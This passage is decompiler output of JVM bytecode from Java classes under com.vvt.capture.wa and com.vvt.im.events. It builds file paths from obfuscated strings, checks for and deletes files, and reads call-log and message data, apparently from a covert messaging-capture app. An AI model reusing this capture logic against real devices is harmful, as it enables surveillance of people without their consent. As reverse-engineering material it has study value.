    //   1144: invokespecial 310	java/util/ArrayList:<init>	()V
    //   1147: aconst_null
    //   1148: astore 31
    //   1150: iconst_1
    //   1151: istore 12
    //   1153: iload_3
    //   1154: iload 12
    //   1156: if_icmpne +594 -> 1750
    //   1159: new 123	java/io/File
    //   1162: astore 9
    //   1164: ldc_w 312
    //   1167: astore 15
    //   1169: aload 15
    //   1171: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1174: astore 15
    //   1176: aload 9
    //   1178: aload 15
    //   1180: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1183: aload 19
    //   1185: aload 9
    //   1187: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1190: pop
    //   1191: new 123	java/io/File
    //   1194: astore 9
    //   1196: ldc_w 318
    //   1199: astore 15
    //   1201: aload 15
    //   1203: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1206: astore 15
    //   1208: aload 9
    //   1210: aload 15
    //   1212: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1215: aload 19
    //   1217: aload 9
    //   1219: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1222: pop
    //   1223: new 123	java/io/File
    //   1226: astore 9
    //   1228: ldc_w 320
    //   1231: astore 15
    //   1233: aload 15
    //   1235: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1238: astore 15
    //   1240: aload 9
    //   1242: aload 15
    //   1244: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1247: aload 19
    //   1249: aload 9
    //   1251: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1254: pop
    //   1255: ldc_w 322
    //   1258: astore 31
    //   1260: aload 19
    //   1262: invokevirtual 326	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   1265: astore 19
    //   1267: aload 16
    //   1269: astore 37
    //   1271: aload 19
    //   1273: invokeinterface 331 1 0
    //   1278: istore 12
    //   1280: iload 12
    //   1282: ifeq +105 -> 1387
    //   1285: aload 19
    //   1287: invokeinterface 334 1 0
    //   1292: astore 16
    //   1294: aload 16
    //   1296: checkcast 123	java/io/File
    //   1299: astore 16
    //   1301: aload 5
    //   1303: invokevirtual 276	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   1306: astore 38
    //   1308: aload 16
    //   1310: aload 18
    //   1312: lload 26
    //   1314: lload 24
    //   1316: aload 31
    //   1318: aload 37
    //   1320: aload 38
    //   1322: invokestatic 161	com/vvt/capture/wa/removeFromPath/a:a	(Ljava/io/File;Ljava/lang/String;JJLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/wa/full/MyUncaughtExceptionHandler;
    //   1325: astore 9
    //   1327: aload 9
    //   1329: getfield 166	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   1332: astore 37
    //   1334: aload 9
    //   1336: getfield 286	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   1339: astore 18
    //   1341: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   1344: istore 12
    //   1346: iload 12
    //   1348: ifeq +3 -> 1351
    //   1351: aload 37
    //   1353: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1356: istore 12
    //   1358: iload 12
    //   1360: ifne -89 -> 1271
    //   1363: new 123	java/io/File
    //   1366: astore 9
    //   1368: aload 9
    //   1370: aload 37
    //   1372: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1375: aload 9
    //   1377: invokevirtual 174	java/io/File:exists	()Z
    //   1380: istore 12
    //   1382: iload 12
    //   1384: ifeq -113 -> 1271
    //   1387: aload 37
    //   1389: ifnull +779 -> 2168
    //   1392: iconst_2
    //   1393: istore 7
    //   1395: iload_3
    //   1396: iload 7
    //   1398: if_icmpne +770 -> 2168
    //   1401: new 123	java/io/File
    //   1404: astore 19
    //   1406: aload 19
    //   1408: aload 37
    //   1410: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1413: aload 19
    //   1415: invokevirtual 174	java/io/File:exists	()Z
    //   1418: istore 7
    //   1420: iload 7
    //   1422: ifne +746 -> 2168
    //   1425: new 123	java/io/File
    //   1428: astore 16
    //   1430: ldc_w 336
    //   1433: astore 19
    //   1435: aload 19
    //   1437: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1440: astore 19
    //   1442: aload 16
    //   1444: aload 19
    //   1446: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1449: ldc_w 338
    //   1452: astore 31
    //   1454: aload 5
    //   1456: invokevirtual 276	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   1459: astore 38
    //   1461: aload 16
    //   1463: aload 18
    //   1465: lload 26
    //   1467: lload 24
    //   1469: aload 31
    //   1471: aload 37
    //   1473: aload 38
    //   1475: invokestatic 161	com/vvt/capture/wa/removeFromPath/a:a	(Ljava/io/File;Ljava/lang/String;JJLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/wa/full/MyUncaughtExceptionHandler;
    //   1478: astore 19
    //   1480: aload 19
    //   1482: getfield 166	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   1485: astore 37
    //   1487: aload 19
    //   1489: getfield 286	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   1492: astore 18
    //   1494: aload 37
    //   1496: astore 16
    //   1498: aload 18
    //   1500: astore 9
    //   1502: aload 16
    //   1504: ifnull +653 -> 2157
    //   1507: new 123	java/io/File
    //   1510: astore 19
    //   1512: aload 19
    //   1514: aload 16
    //   1516: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1519: aload 19
    //   1521: invokevirtual 174	java/io/File:exists	()Z
    //   1524: istore 7
    //   1526: iload 7
    //   1528: ifne +6 -> 1534
    //   1531: aconst_null
    //   1532: astore 16
    //   1534: iconst_0
    //   1535: istore 7
    //   1537: aconst_null
    //   1538: astore 19
    //   1540: iconst_0
    //   1541: newarray <illegal type>
    //   1543: astore 19
    //   1545: aload 23
    //   1547: ifnull +20 -> 1567
    //   1550: aload 23
    //   1552: invokevirtual 341	java/lang/String:length	()I
    //   1555: istore 14
    //   1557: iconst_1
    //   1558: istore 35
    //   1560: iload 14
    //   1562: iload 35
    //   1564: if_icmpge +586 -> 2150
    //   1567: iload 6
    //   1569: ifeq +581 -> 2150
    //   1572: ldc -67
    //   1574: astore 15
    //   1576: ldc2_w 342
    //   1579: lstore 24
    //   1581: iconst_3
    //   1582: istore 17
    //   1584: iload_2
    //   1585: aload 15
    //   1587: lload 24
    //   1589: iload 17
    //   1591: invokestatic 303	com/vvt/capture/wa/full/a:a	(ILjava/lang/String;JI)Ljava/lang/String;
    //   1594: astore 23
    //   1596: aload 23
    //   1598: astore 15
    //   1600: aload 15
    //   1602: ifnull +20 -> 1622
    //   1605: aload 15
    //   1607: invokevirtual 341	java/lang/String:length	()I
    //   1610: istore 35
    //   1612: iconst_1
    //   1613: istore 36
    //   1615: iload 35
    //   1617: iload 36
    //   1619: if_icmpge +48 -> 1667
    //   1622: aload 9
    //   1624: invokestatic 348	com/vvt/io/d:i	(Ljava/lang/String;)Ljava/lang/String;
    //   1627: astore 15
    //   1629: aload 15
    //   1631: ifnull +36 -> 1667
    //   1634: ldc_w 350
    //   1637: astore 10
    //   1639: aload 15
    //   1641: aload 10
    //   1643: invokevirtual 354	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   1646: istore 35
    //   1648: iload 35
    //   1650: ifeq +17 -> 1667
    //   1653: iconst_2
    //   1654: istore 35
    //   1656: iload_3
    //   1657: iload 35
    //   1659: if_icmpne +8 -> 1667
    //   1662: ldc_w 356
    //   1665: astore 15
    //   1667: aload 15
    //   1669: ifnull +20 -> 1689
    //   1672: aload 15
    //   1674: invokevirtual 341	java/lang/String:length	()I
    //   1677: istore 35
    //   1679: iconst_1
    //   1680: istore 36
    //   1682: iload 35
    //   1684: iload 36
    //   1686: if_icmpge +17 -> 1703
    //   1689: iconst_1
    //   1690: istore 35
    //   1692: iload_3
    //   1693: iload 35
    //   1695: if_icmpne +309 -> 2004
    //   1698: ldc_w 358
    //   1701: astore 15
    //   1703: aload 15
    //   1705: ifnonnull -1152 -> 553
    //   1708: ldc_w 360
    //   1711: astore 15
    //   1713: goto -1160 -> 553
    //   1716: ldc_w 259
    //   1719: astore 19
    //   1721: aload 20
    //   1723: astore 21
    //   1725: aload 20
    //   1727: aload 19
    //   1729: invokeinterface 96 2 0
    //   1734: istore 7
    //   1736: aload 20
    //   1738: iload 7
    //   1740: invokeinterface 100 2 0
    //   1745: astore 18
    //   1747: goto -620 -> 1127
    //   1750: iconst_2
    //   1751: istore 12
    //   1753: iload_3
    //   1754: iload 12
    //   1756: if_icmpne +43 -> 1799
    //   1759: new 123	java/io/File
    //   1762: astore 9
    //   1764: ldc_w 362
    //   1767: astore 15
    //   1769: aload 15
    //   1771: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1774: astore 15
    //   1776: aload 9
    //   1778: aload 15
    //   1780: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1783: aload 19
    //   1785: aload 9
    //   1787: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1790: pop
    //   1791: ldc_w 364
    //   1794: astore 31
    //   1796: goto -536 -> 1260
    //   1799: iconst_3
    //   1800: istore 12
    //   1802: iload_3
    //   1803: iload 12
    //   1805: if_icmpne +137 -> 1942
    //   1808: new 123	java/io/File
    //   1811: astore 9
    //   1813: ldc 125
    //   1815: astore 15
    //   1817: aload 15
    //   1819: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1822: astore 15
    //   1824: aload 9
    //   1826: aload 15
    //   1828: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1831: aload 19
    //   1833: aload 9
    //   1835: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1838: pop
    //   1839: new 123	java/io/File
    //   1842: astore 9
    //   1844: ldc_w 318
    //   1847: astore 15
    //   1849: aload 15
    //   1851: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1854: astore 15
    //   1856: aload 9
    //   1858: aload 15
    //   1860: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1863: aload 19
    //   1865: aload 9
    //   1867: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1870: pop
    //   1871: new 123	java/io/File
    //   1874: astore 9
    //   1876: ldc_w 320
    //   1879: astore 15
    //   1881: aload 15
    //   1883: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1886: astore 15
    //   1888: aload 9
    //   1890: aload 15
    //   1892: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1895: aload 19
    //   1897: aload 9
    //   1899: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1902: pop
    //   1903: new 123	java/io/File
    //   1906: astore 9
    //   1908: ldc_w 366
    //   1911: astore 15
    //   1913: aload 15
    //   1915: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1918: astore 15
    //   1920: aload 9
    //   1922: aload 15
    //   1924: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1927: aload 19
    //   1929: aload 9
    //   1931: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1934: pop
    //   1935: ldc -121
    //   1937: astore 31
    //   1939: goto -679 -> 1260
    //   1942: bipush 9
    //   1944: istore 12
    //   1946: iload_3
    //   1947: iload 12
    //   1949: if_icmpne -689 -> 1260
    //   1952: new 123	java/io/File
    //   1955: astore 9
    //   1957: ldc_w 263
    //   1960: astore 15
    //   1962: aload 15
    //   1964: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   1967: astore 15
    //   1969: aload 9
    //   1971: aload 15
    //   1973: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   1976: aload 19
    //   1978: aload 9
    //   1980: invokevirtual 316	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1983: pop
    //   1984: aload 18
    //   1986: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1989: istore 12
    //   1991: iload 12
    //   1993: ifeq +186 -> 2179
    //   1996: ldc_w 368
    //   1999: astore 31
    //   2001: goto -741 -> 1260
    //   2004: iconst_2
    //   2005: istore 35
    //   2007: iload_3
    //   2008: iload 35
    //   2010: if_icmpne +11 -> 2021
    //   2013: ldc_w 356
    //   2016: astore 15
    //   2018: goto -315 -> 1703
    //   2021: iconst_3
    //   2022: istore 35
    //   2024: iload_3
    //   2025: iload 35
    //   2027: if_icmpne -324 -> 1703
    //   2030: ldc_w 370
    //   2033: astore 15
    //   2035: goto -332 -> 1703
    //   2038: aload 8
    //   2040: aload 28
    //   2042: invokevirtual 256	com/vvt/im/events/info/a:e	(Ljava/lang/String;)V
    //   2045: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   2048: istore 7
    //   2050: iload 7
    //   2052: ifeq +3 -> 2055
    //   2055: new 123	java/io/File
    //   2058: astore 19
    //   2060: aload 19
    //   2062: aload 16
    //   2064: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   2067: aload 19
    //   2069: invokevirtual 174	java/io/File:exists	()Z
    //   2072: istore 12
    //   2074: iload 12
    //   2076: ifeq -1405 -> 671
    //   2079: aload 19
    //   2081: invokevirtual 373	java/io/File:delete	()Z
    //   2084: pop
    //   2085: goto -1414 -> 671
    //   2088: astore 19
    //   2090: aload 20
    //   2092: ifnull +10 -> 2102
    //   2095: aload 20
    //   2097: invokeinterface 116 1 0
    //   2102: aload 19
    //   2104: athrow
    //   2105: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   2108: istore 7
    //   2110: iload 7
    //   2112: ifeq -1441 -> 671
    //   2115: goto -1444 -> 671
    //   2118: astore 19
    //   2120: aconst_null
    //   2121: astore 20
    //   2123: goto -33 -> 2090
    //   2126: astore 9
    //   2128: aload 19
    //   2130: astore 20
    //   2132: aload 9
    //   2134: astore 19
    //   2136: goto -46 -> 2090
    //   2139: astore 19
    //   2141: iconst_0
    //   2142: istore 7
    //   2144: aconst_null
    //   2145: astore 19
    //   2147: goto -1340 -> 807
    //   2150: aload 23
    //   2152: astore 15
    //   2154: goto -554 -> 1600
    //   2157: aload 29
    //   2159: astore 19
    //   2161: aload 23
    //   2163: astore 15
    //   2165: goto -1612 -> 553
    //   2168: aload 37
    //   2170: astore 16
    //   2172: aload 18
    //   2174: astore 9
    //   2176: goto -674 -> 1502
    //   2179: aload 18
    //   2181: astore 31
    //   2183: goto -923 -> 1260
    //   2186: lload 26
    //   2188: lstore 32
    //   2190: goto -1728 -> 462
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	2193	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	2193	1	paramString	String
    //   0	2193	2	paramInt1	int
    //   0	2193	3	paramInt2	int
    //   0	2193	4	paramDirection	ICallLogData.Direction
    //   0	2193	5	paramb	com.vvt.base.removeFromPath
    //   0	2193	6	paramBoolean	boolean
    //   3	158	7	bool1	boolean
    //   182	119	7	i	int
    //   686	3	7	bool2	boolean
    //   698	141	7	j	int
    //   852	3	7	bool3	boolean
    //   877	59	7	k	int
    //   949	3	7	bool4	boolean
    //   974	5	7	m	int
    //   1056	3	7	bool5	boolean
    //   1064	6	7	n	int
    //   1130	3	7	bool6	boolean
    //   1393	6	7	i1	int
    //   1418	118	7	bool7	boolean
    //   1734	5	7	i2	int
    //   2048	95	7	bool8	boolean
    //   13	2026	8	locala	com.vvt.im.events.info.a
    //   24	1955	9	localObject1	Object
    //   2126	7	9	localObject2	Object
    //   2174	1	9	localObject3	Object
    //   39	1603	10	localObject4	Object
    //   45	91	11	arrayOfString	String[]
    //   83	1074	12	i3	int
    //   1278	105	12	bool9	boolean
    //   1751	199	12	i4	int
    //   1989	86	12	bool10	boolean
    //   105	35	13	str1	String
    //   112	1453	14	i5	int
    //   115	2049	15	localObject5	Object
    //   118	2053	16	localObject6	Object
    //   121	386	17	i6	int
    //   520	83	17	bool11	boolean
    //   1089	501	17	i7	int
    //   124	2056	18	str2	String
    //   127	637	19	localObject7	Object
    //   801	1	19	localException1	Exception
    //   805	1275	19	localObject8	Object
    //   2088	15	19	localObject9	Object
    //   2118	11	19	localObject10	Object
    //   2134	1	19	localObject11	Object
    //   2139	1	19	localException2	Exception
    //   2145	15	19	localObject12	Object
    //   144	1987	20	localObject13	Object
    //   171	1553	21	localObject14	Object
    //   193	841	22	str3	String
    //   219	1943	23	str4	String
    //   245	1343	24	l1	long
    //   271	1916	26	l2	long
    //   297	1744	28	str5	String
    //   318	1840	29	localObject15	Object
    //   341	192	30	str6	String
    //   353	1829	31	str7	String
    //   421	1768	32	l3	long
    //   473	3	34	bool12	boolean
    //   615	950	35	i8	int
    //   1610	10	35	i9	int
    //   1646	3	35	bool13	boolean
    //   1654	374	35	i10	int
    //   620	1000	36	i11	int
    //   1680	7	36	i12	int
    //   1269	900	37	localObject16	Object
    //   1306	168	38	str8	String
    // Exception table:
    //   from	to	target	type
    //   151	158	801	java/lang/Exception
    //   175	182	801	java/lang/Exception
    //   186	193	801	java/lang/Exception
    //   201	208	801	java/lang/Exception
    //   212	219	801	java/lang/Exception
    //   227	234	801	java/lang/Exception
    //   238	245	801	java/lang/Exception
    //   253	260	801	java/lang/Exception
    //   264	271	801	java/lang/Exception
    //   279	286	801	java/lang/Exception
    //   290	297	801	java/lang/Exception
    //   311	314	801	java/lang/Exception
    //   320	323	801	java/lang/Exception
    //   325	328	801	java/lang/Exception
    //   336	341	801	java/lang/Exception
    //   343	346	801	java/lang/Exception
    //   348	353	801	java/lang/Exception
    //   355	358	801	java/lang/Exception
    //   360	365	801	java/lang/Exception
    //   367	372	801	java/lang/Exception
    //   374	377	801	java/lang/Exception
    //   381	386	801	java/lang/Exception
    //   390	395	801	java/lang/Exception
    //   397	402	801	java/lang/Exception
    //   404	407	801	java/lang/Exception
    //   435	438	801	java/lang/Exception
    //   445	450	801	java/lang/Exception
    //   452	455	801	java/lang/Exception
    //   483	488	801	java/lang/Exception
    //   515	520	801	java/lang/Exception
    //   534	539	801	java/lang/Exception
    //   558	561	801	java/lang/Exception
    //   565	570	801	java/lang/Exception
    //   570	575	801	java/lang/Exception
    //   577	580	801	java/lang/Exception
    //   587	590	801	java/lang/Exception
    //   597	600	801	java/lang/Exception
    //   610	615	801	java/lang/Exception
    //   617	620	801	java/lang/Exception
    //   638	643	801	java/lang/Exception
    //   645	650	801	java/lang/Exception
    //   652	657	801	java/lang/Exception
    //   659	664	801	java/lang/Exception
    //   666	671	801	java/lang/Exception
    //   717	724	801	java/lang/Exception
    //   728	735	801	java/lang/Exception
    //   737	742	801	java/lang/Exception
    //   749	754	801	java/lang/Exception
    //   763	768	801	java/lang/Exception
    //   770	775	801	java/lang/Exception
    //   779	784	801	java/lang/Exception
    //   784	789	801	java/lang/Exception
    //   793	798	801	java/lang/Exception
    //   847	852	801	java/lang/Exception
    //   870	877	801	java/lang/Exception
    //   881	888	801	java/lang/Exception
    //   890	895	801	java/lang/Exception
    //   905	910	801	java/lang/Exception
    //   912	917	801	java/lang/Exception
    //   919	924	801	java/lang/Exception
    //   944	949	801	java/lang/Exception
    //   967	974	801	java/lang/Exception
    //   978	985	801	java/lang/Exception
    //   987	992	801	java/lang/Exception
    //   1002	1007	801	java/lang/Exception
    //   1009	1014	801	java/lang/Exception
    //   1016	1021	801	java/lang/Exception
    //   1026	1031	801	java/lang/Exception
    //   1035	1040	801	java/lang/Exception
    //   1053	1056	801	java/lang/Exception
    //   1096	1102	801	java/lang/Exception
    //   1120	1125	801	java/lang/Exception
    //   1127	1130	801	java/lang/Exception
    //   1137	1140	801	java/lang/Exception
    //   1142	1147	801	java/lang/Exception
    //   1159	1162	801	java/lang/Exception
    //   1169	1174	801	java/lang/Exception
    //   1178	1183	801	java/lang/Exception
    //   1185	1191	801	java/lang/Exception
    //   1191	1194	801	java/lang/Exception
    //   1201	1206	801	java/lang/Exception
    //   1210	1215	801	java/lang/Exception
    //   1217	1223	801	java/lang/Exception
    //   1223	1226	801	java/lang/Exception
    //   1233	1238	801	java/lang/Exception
    //   1242	1247	801	java/lang/Exception
    //   1249	1255	801	java/lang/Exception
    //   1260	1265	801	java/lang/Exception
    //   1271	1278	801	java/lang/Exception
    //   1285	1292	801	java/lang/Exception
    //   1294	1299	801	java/lang/Exception
    //   1301	1306	801	java/lang/Exception
    //   1320	1325	801	java/lang/Exception
    //   1327	1332	801	java/lang/Exception
    //   1334	1339	801	java/lang/Exception
    //   1341	1344	801	java/lang/Exception
    //   1351	1356	801	java/lang/Exception
    //   1363	1366	801	java/lang/Exception
    //   1370	1375	801	java/lang/Exception
    //   1375	1380	801	java/lang/Exception
    //   1401	1404	801	java/lang/Exception
    //   1408	1413	801	java/lang/Exception
    //   1413	1418	801	java/lang/Exception
    //   1425	1428	801	java/lang/Exception
    //   1435	1440	801	java/lang/Exception
    //   1444	1449	801	java/lang/Exception
    //   1454	1459	801	java/lang/Exception
    //   1473	1478	801	java/lang/Exception
    //   1480	1485	801	java/lang/Exception
    //   1487	1492	801	java/lang/Exception
    //   1507	1510	801	java/lang/Exception
    //   1514	1519	801	java/lang/Exception
    //   1519	1524	801	java/lang/Exception
    //   1540	1543	801	java/lang/Exception
    //   1550	1555	801	java/lang/Exception
    //   1589	1594	801	java/lang/Exception
    //   1605	1610	801	java/lang/Exception
    //   1622	1627	801	java/lang/Exception
    //   1641	1646	801	java/lang/Exception
    //   1672	1677	801	java/lang/Exception
    //   1727	1734	801	java/lang/Exception
    //   1738	1745	801	java/lang/Exception
    //   1759	1762	801	java/lang/Exception
    //   1769	1774	801	java/lang/Exception
    //   1778	1783	801	java/lang/Exception
    //   1785	1791	801	java/lang/Exception
    //   1808	1811	801	java/lang/Exception
    //   1817	1822	801	java/lang/Exception
    //   1826	1831	801	java/lang/Exception
    //   1833	1839	801	java/lang/Exception
    //   1839	1842	801	java/lang/Exception
    //   1849	1854	801	java/lang/Exception
    //   1858	1863	801	java/lang/Exception
    //   1865	1871	801	java/lang/Exception
    //   1871	1874	801	java/lang/Exception
    //   1881	1886	801	java/lang/Exception
    //   1890	1895	801	java/lang/Exception
    //   1897	1903	801	java/lang/Exception
    //   1903	1906	801	java/lang/Exception
    //   1913	1918	801	java/lang/Exception
    //   1922	1927	801	java/lang/Exception
    //   1929	1935	801	java/lang/Exception
    //   1952	1955	801	java/lang/Exception
    //   1962	1967	801	java/lang/Exception
    //   1971	1976	801	java/lang/Exception
    //   1978	1984	801	java/lang/Exception
    //   1984	1989	801	java/lang/Exception
    //   2040	2045	801	java/lang/Exception
    //   2045	2048	801	java/lang/Exception
    //   2055	2058	801	java/lang/Exception
    //   2062	2067	801	java/lang/Exception
    //   2067	2072	801	java/lang/Exception
    //   2079	2085	801	java/lang/Exception
    //   2105	2108	801	java/lang/Exception
    //   151	158	2088	finally
    //   175	182	2088	finally
    //   186	193	2088	finally
    //   201	208	2088	finally
    //   212	219	2088	finally
    //   227	234	2088	finally
    //   238	245	2088	finally
    //   253	260	2088	finally
    //   264	271	2088	finally
    //   279	286	2088	finally
    //   290	297	2088	finally
    //   311	314	2088	finally
    //   320	323	2088	finally
    //   325	328	2088	finally
    //   336	341	2088	finally
    //   343	346	2088	finally
    //   348	353	2088	finally
    //   355	358	2088	finally
    //   360	365	2088	finally
    //   367	372	2088	finally
    //   374	377	2088	finally
    //   381	386	2088	finally
    //   390	395	2088	finally
    //   397	402	2088	finally
    //   404	407	2088	finally
    //   435	438	2088	finally
    //   445	450	2088	finally
    //   452	455	2088	finally
    //   483	488	2088	finally
    //   515	520	2088	finally
    //   534	539	2088	finally
    //   558	561	2088	finally
    //   565	570	2088	finally
    //   570	575	2088	finally
    //   577	580	2088	finally
    //   587	590	2088	finally
    //   597	600	2088	finally
    //   610	615	2088	finally
    //   617	620	2088	finally
    //   638	643	2088	finally
    //   645	650	2088	finally
    //   652	657	2088	finally
    //   659	664	2088	finally
    //   666	671	2088	finally
    //   717	724	2088	finally
    //   728	735	2088	finally
    //   737	742	2088	finally
    //   749	754	2088	finally
    //   763	768	2088	finally
    //   770	775	2088	finally
    //   779	784	2088	finally
    //   784	789	2088	finally
    //   793	798	2088	finally
    //   847	852	2088	finally
    //   870	877	2088	finally
    //   881	888	2088	finally
    //   890	895	2088	finally
    //   905	910	2088	finally
    //   912	917	2088	finally
    //   919	924	2088	finally
    //   944	949	2088	finally
    //   967	974	2088	finally
    //   978	985	2088	finally
    //   987	992	2088	finally
    //   1002	1007	2088	finally
    //   1009	1014	2088	finally
    //   1016	1021	2088	finally
    //   1026	1031	2088	finally
    //   1035	1040	2088	finally
    //   1053	1056	2088	finally
    //   1096	1102	2088	finally
    //   1120	1125	2088	finally
    //   1127	1130	2088	finally
    //   1137	1140	2088	finally
    //   1142	1147	2088	finally
    //   1159	1162	2088	finally
    //   1169	1174	2088	finally
    //   1178	1183	2088	finally
    //   1185	1191	2088	finally
    //   1191	1194	2088	finally
    //   1201	1206	2088	finally
    //   1210	1215	2088	finally
    //   1217	1223	2088	finally
    //   1223	1226	2088	finally
    //   1233	1238	2088	finally
    //   1242	1247	2088	finally
    //   1249	1255	2088	finally
    //   1260	1265	2088	finally
    //   1271	1278	2088	finally
    //   1285	1292	2088	finally
    //   1294	1299	2088	finally
    //   1301	1306	2088	finally
    //   1320	1325	2088	finally
    //   1327	1332	2088	finally
    //   1334	1339	2088	finally
    //   1341	1344	2088	finally
    //   1351	1356	2088	finally
    //   1363	1366	2088	finally
    //   1370	1375	2088	finally
    //   1375	1380	2088	finally
    //   1401	1404	2088	finally
    //   1408	1413	2088	finally
    //   1413	1418	2088	finally
    //   1425	1428	2088	finally
    //   1435	1440	2088	finally
    //   1444	1449	2088	finally
    //   1454	1459	2088	finally
    //   1473	1478	2088	finally
    //   1480	1485	2088	finally
    //   1487	1492	2088	finally
    //   1507	1510	2088	finally
    //   1514	1519	2088	finally
    //   1519	1524	2088	finally
    //   1540	1543	2088	finally
    //   1550	1555	2088	finally
    //   1589	1594	2088	finally
    //   1605	1610	2088	finally
    //   1622	1627	2088	finally
    //   1641	1646	2088	finally
    //   1672	1677	2088	finally
    //   1727	1734	2088	finally
    //   1738	1745	2088	finally
    //   1759	1762	2088	finally
    //   1769	1774	2088	finally
    //   1778	1783	2088	finally
    //   1785	1791	2088	finally
    //   1808	1811	2088	finally
    //   1817	1822	2088	finally
    //   1826	1831	2088	finally
    //   1833	1839	2088	finally
    //   1839	1842	2088	finally
    //   1849	1854	2088	finally
    //   1858	1863	2088	finally
    //   1865	1871	2088	finally
    //   1871	1874	2088	finally
    //   1881	1886	2088	finally
    //   1890	1895	2088	finally
    //   1897	1903	2088	finally
    //   1903	1906	2088	finally
    //   1913	1918	2088	finally
    //   1922	1927	2088	finally
    //   1929	1935	2088	finally
    //   1952	1955	2088	finally
    //   1962	1967	2088	finally
    //   1971	1976	2088	finally
    //   1978	1984	2088	finally
    //   1984	1989	2088	finally
    //   2040	2045	2088	finally
    //   2045	2048	2088	finally
    //   2055	2058	2088	finally
    //   2062	2067	2088	finally
    //   2067	2072	2088	finally
    //   2079	2085	2088	finally
    //   2105	2108	2088	finally
    //   139	144	2118	finally
    //   807	810	2126	finally
    //   139	144	2139	java/lang/Exception
  }
  
  /* Error */
  public static com.vvt.im.events.info.d a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: iconst_m1
    //   6: istore 5
    //   8: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   11: istore 6
    //   13: iload 6
    //   15: ifeq +3 -> 18
    //   18: new 375	com/vvt/im/events/info/d
    //   21: astore 7
    //   23: aload 7
    //   25: invokespecial 376	com/vvt/im/events/info/d:<init>	()V
    //   28: ldc 70
    //   30: astore 8
    //   32: new 378	java/io/FileReader
    //   35: astore 9
    //   37: aload 9
    //   39: aload_1
    //   40: invokespecial 379	java/io/FileReader:<init>	(Ljava/lang/String;)V
    //   43: new 381	java/io/BufferedReader
    //   46: astore 8
    //   48: sipush 256
    //   51: istore 10
    //   53: aload 8
    //   55: aload 9
    //   57: iload 10
    //   59: invokespecial 385	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   62: aload 8
    //   64: invokevirtual 388	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   67: astore 4
    //   69: aload 4
    //   71: ifnull +561 -> 632
    //   74: ldc_w 390
    //   77: astore 11
    //   79: aload 4
    //   81: aload 11
    //   83: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   86: istore 10
    //   88: ldc_w 395
    //   91: astore 12
    //   93: aload 4
    //   95: aload 12
    //   97: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   100: istore 13
    //   102: ldc_w 397
    //   105: astore 14
    //   107: aload 4
    //   109: aload 14
    //   111: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
